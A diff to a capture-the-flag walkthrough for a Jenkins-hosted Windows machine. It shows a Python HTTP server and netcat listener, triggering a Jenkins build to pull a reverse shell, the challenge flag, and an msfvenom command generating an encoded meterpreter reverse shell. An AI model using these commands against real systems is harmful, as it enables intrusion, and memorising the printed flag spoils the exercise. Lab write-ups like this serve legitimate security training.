@@ -54,4 +54,20 @@ Disallow: /
             - `python3 -m http.server <port>` to serve everything in that folder (`python -m SimpleHTTPServer <attack machine port 1> for older Python versions)
         - Netcat Listener to receive reverse shell connection
             - `nc -lvnp <attack machine port 2>` to listen on the port set in the powershell one-liner (may need to use `ncat -lvnp <attack machine port 2>` for newer distros)
+    - Build the "project" in Jenkins that will reach out to pull the reverse shell
+- Once connected to machine, change to `C:\Users\` directory and fine the flag in *bruce*'s desktop folder
 
+> <details><summary>The flag is </summary>79007a09481963edf2e1321abd9ae2a0</summary>
+
+## Switching Shells
+
+- Privilege escalation will be much easier with a meterpreter shell (hosted through metasploit)
+- Generate meterpreter reverse shell
+    - `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<attack machine IP> LPORT=<attack machine port> -f exe -o hehe.exe` to generate reverse shell with meterpreter
+    - **REMINDER**: The port must be different than the one used for the original reverse shell
+
+> The shell generated should have a final size of **73802**
+
+## Privilege Escalation
+
+-
